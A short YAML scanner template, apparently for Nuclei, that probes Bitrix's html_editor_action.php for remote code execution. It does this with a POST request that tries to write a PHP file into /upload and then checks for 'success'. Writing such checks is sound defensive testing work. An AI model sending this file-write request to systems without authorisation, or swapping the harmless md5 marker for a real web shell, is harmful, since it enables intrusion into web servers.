id: bitrix-2025-06613-html-editor-action

info:
  name: Bitrix HTML Editor Potential RCE
  author: clevergod
  severity: high
  tags: bitrix,rce,upload

requests:
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/html_editor_action.php"
    body: |
      sessid=123456789&action=save_file&path=/upload/test.php&content=<?php echo md5(1337); ?>
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "success"